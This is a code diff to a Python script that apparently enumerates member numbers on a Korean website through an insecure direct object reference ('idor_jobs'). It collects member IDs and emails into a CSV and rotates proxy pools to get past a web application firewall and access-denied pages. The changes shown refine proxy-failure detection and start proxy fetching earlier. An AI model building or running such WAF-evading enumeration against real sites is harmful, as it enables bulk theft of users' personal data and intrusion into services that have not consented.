@@ -293,7 +293,9 @@ def is_waf_text(status: int, text: str) -> bool:
 
 def is_proxy_auth_fail(exc: BaseException | None = None, text: str = "") -> bool:
     blob = f"{exc} {text}".lower()
-    return "407" in blob or "white list" in blob or "not authorized" in blob
+    if "<html" in blob or "에러페이지" in blob or "access denied" in blob:
+        return False
+    return "407" in blob or "white list" in blob or "whitelist" in blob
 
 
 def json_from_response(resp: requests.Response) -> dict[str, Any] | None:
@@ -1023,9 +1025,6 @@ def main() -> None:
         sw.writerow(["mbrNo", "status", "mbrId"])
 
     pool = init_pool()
-    pool.load_static()
-    if pool.urls:
-        pool.fetch_all()
 
     def _panda_topup() -> None:
         while True:
@@ -1038,8 +1037,11 @@ def main() -> None:
             time.sleep(TOPUP_HUNGRY if pool.panda_good_n() < KEEP_LIVE else TOPUP_IDLE)
 
     def _static_topup() -> None:
+        first = True
         while True:
-            time.sleep(15)
+            if not first:
+                time.sleep(15)
+            first = False
             try:
                 pool.sync_static()
             except Exception:
@@ -1047,6 +1049,8 @@ def main() -> None:
 
     threading.Thread(target=_panda_topup, name="panda-topup", daemon=True).start()
     threading.Thread(target=_static_topup, name="static-topup", daemon=True).start()
+    if pool.urls:
+        pool.fetch_all()
 
     mail_jobs, head, tail, holes = build_jobs(START, END, have_id, have_email, scanned)
     idor_jobs = tail + head + holes
